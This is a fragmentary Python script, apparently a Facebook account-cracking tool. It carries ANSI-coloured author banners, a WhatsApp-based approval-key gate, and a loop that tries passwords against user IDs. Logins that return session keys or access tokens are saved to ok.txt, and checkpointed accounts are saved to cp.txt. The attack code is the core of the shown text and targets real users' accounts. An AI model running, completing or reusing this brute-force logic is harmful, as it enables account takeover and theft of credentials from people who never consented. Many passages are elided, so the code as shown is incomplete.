...
##     ## ##     ## #### ##    ##  #######  ######## 
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m 𝐌𝐀𝐈𝐍𝐔𝐋-𝐈𝐒𝐋𝐀𝐌\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 3.1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
 """)
def logo2():
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 :3.1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : 𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐒𝐌\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : 𝐌41𝐍𝐔𝐋\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : 𝐌𝐃 𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/M41NUL/mainul-approval.txt/blob/main/mainul123%2C-approval.txt"])
...
def notice():
	...
	os.system("xdg-open https://wa.me/+8801308850528?app=fbl")
	runtxt("\033[0;97m Your Key >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Approval Neyar Jonno Whatsapp A key Dao ")
	os.system("xdg-open https://wa.me/+8801308850528?text=")
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/M41NUL/mainul-approval.txt/blob/main/mainul123%2C-approval.txt')
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/Mainul.Islam.Official.Info"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=𝐌𝐀𝐈𝐍𝐔𝐋=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=𝐌𝐀𝐈𝐍𝐔𝐋=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=𝐌𝐀𝐈𝐍𝐔𝐋=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=𝐌𝐀𝐈𝐍𝐔𝐋=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      : -- \n")
		print(" [ Sosial Media  ] -- \n")
		print(" [*] Facebook  : 𝐌𝐃 𝐌𝐀𝐈𝐍𝐔𝐋 𝐈𝐒𝐋𝐀𝐌")
		print(" [*] Instagram : --/n")
		exit(" [*] GitHub    : 𝐌41𝐍𝐔𝐋 ")
	else:
		Main()
